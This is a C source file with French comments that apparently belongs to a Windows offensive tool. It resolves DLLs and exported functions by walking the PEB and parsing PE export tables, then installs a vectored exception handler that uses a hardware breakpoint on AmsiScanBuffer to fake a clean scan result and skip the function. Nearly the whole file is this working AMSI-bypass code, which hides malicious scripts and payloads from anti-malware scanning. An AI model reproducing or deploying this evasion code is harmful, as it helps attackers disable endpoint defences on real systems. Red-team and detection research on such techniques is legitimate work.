#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include "peb.h"
#include "tools.h"


// Fonction pour parcourir le PEB et trouver l'adresse d'une DLL
PVOID pebWalking(const wchar_t* dllSearched) {
    PVOID dll_addr = NULL;

    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA peb_ldr = peb->Ldr;
    PLIST_ENTRY head = &peb_ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(
            curr,
            MY_LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );

        if (entry->BaseDllName.Buffer != NULL &&
            _wcsicmp(entry->BaseDllName.Buffer, dllSearched) == 0) {
            return entry->DllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

// Fonction pour parser le PE et trouver l'adresse d'une fonction exportée
PVOID peParsing(PVOID dll_addr, const char* funcName) {
    if (!dll_addr) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_addr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_addr + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)dll_addr + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* funAddrs = (DWORD*)((BYTE*)dll_addr + expDir->AddressOfFunctions);
    DWORD* funNames = (DWORD*)((BYTE*)dll_addr + expDir->AddressOfNames);
    WORD* funOrdinals = (WORD*)((BYTE*)dll_addr + expDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)dll_addr + funNames[i]);
        if (strcmp(name, funcName) == 0) {
            WORD  ordinal = funOrdinals[i];
            DWORD funcRVA = funAddrs[ordinal];
            return (PVOID)((BYTE*)dll_addr + funcRVA);
        }
    }
    return NULL;
}

// Vectored Exception Handler pour gérer le breakpoint matériel
LONG WINAPI VEH_Handler(EXCEPTION_POINTERS* pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (pExInfo->ContextRecord->Rip == (DWORD64)g_AmsiScanBuffer) {
			pExInfo->ContextRecord->Rax = S_OK;          // S_OK (0) dans le registre RAX
			pExInfo->ContextRecord->Rip =                // Prochaine instruction (RIP) = adresse de retour
                *(ULONG_PTR*)pExInfo->ContextRecord->Rsp; 
            pExInfo->ContextRecord->Rsp += 8;            // pop le return address
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}